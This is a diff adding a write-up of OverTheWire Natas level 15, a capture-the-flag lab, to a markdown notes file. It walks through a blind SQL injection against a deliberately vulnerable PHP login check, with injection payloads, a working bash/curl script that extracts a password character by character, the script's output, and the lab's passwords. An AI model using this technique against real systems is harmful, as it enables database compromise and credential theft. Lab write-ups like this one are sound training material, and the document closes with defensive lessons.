@@ -1003,7 +1003,152 @@ Use prepared statements to prevent **SQL injection**!
 - **Date**: 2026-03-31
 - **URL**: `http://natas15.natas.labs.overthewire.org`
 - **Password**: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `SQL`, `Bash`, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+
+Notice that the `username` parameter is <u>again</u> being directly concatenated into the SQL query without any sanitization!
+If the user exists, the query will execute successfully and the page will say "This user exists.".
+
+Try `natas16" AND 1=1 #` to confirm that SQL injection is <u>possible</u>.
+
+And you will see "This user exists.".
+
+We can use `natas16" AND password LIKE BINARY "a%" #` as the username to extract the password <u>character by character</u>!
+
+But this will take a long time, so let's write a script to automate this!
+
+[level-15\blind_sql.bash](level-15\blind_sql.bash)
+```bash
+#!/bin/bash
+
+URL="http://natas15.natas.labs.overthewire.org/"
+AUTH="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+password=""
+
+for i in $(seq 1 32); do
+  for c in $(echo $chars | fold -w1); do
+
+    attempt="${password}${c}"
+
+    response=$(curl -s -u $AUTH \
+      --data "username=natas16\" AND password LIKE BINARY \"${attempt}%\" #" \
+      "$URL")
+
+    if echo "$response" | grep -q "This user exists"; then
+      password+=$c
+      echo "[+] $password (${#password}/32)"
+      break
+    fi
+
+  done
+done
+
+echo "[✔] Password: $password"
+```
+
+Run `bash level-15\blind_sql.bash` and you will get:
+```powershell
+[+] h (1/32)
+[+] hP (2/32)
+[+] hPk (3/32)
+[+] hPkj (4/32)
+[+] hPkjK (5/32)
+[+] hPkjKY (6/32)
+[+] hPkjKYv (7/32)
+[+] hPkjKYvi (8/32)
+[+] hPkjKYviL (9/32)
+[+] hPkjKYviLQ (10/32)
+[+] hPkjKYviLQc (11/32)
+[+] hPkjKYviLQct (12/32)
+[+] hPkjKYviLQctE (13/32)
+[+] hPkjKYviLQctEW (14/32)
+[+] hPkjKYviLQctEW3 (15/32)
+[+] hPkjKYviLQctEW33 (16/32)
+[+] hPkjKYviLQctEW33Q (17/32)
+[+] hPkjKYviLQctEW33Qm (18/32)
+[+] hPkjKYviLQctEW33Qmu (19/32)
+[+] hPkjKYviLQctEW33QmuX (20/32)
+[+] hPkjKYviLQctEW33QmuXL (21/32)
+[+] hPkjKYviLQctEW33QmuXL6 (22/32)
+[+] hPkjKYviLQctEW33QmuXL6e (23/32)
+[+] hPkjKYviLQctEW33QmuXL6eD (24/32)
+[+] hPkjKYviLQctEW33QmuXL6eDV (25/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVf (26/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfM (27/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfMW (28/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfMW4 (29/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfMW4s (30/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfMW4sG (31/32)
+[+] hPkjKYviLQctEW33QmuXL6eDVfMW4sGo (32/32)
+[✔] Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+And the password for natas16 is `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`.
+
+#### The Lesson
+
+Don't reveal whether a user exists or not in your login error messages!
+(And really do use prepared statements to prevent SQL injection!)
+
+### Level 16
+
+- **Date**: 2026-03-31
+- **URL**: `http://natas16.natas.labs.overthewire.org`
+- **Password**: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
+- **Tools**: Web Browser, `PHP`
 
 #### The Solution
 
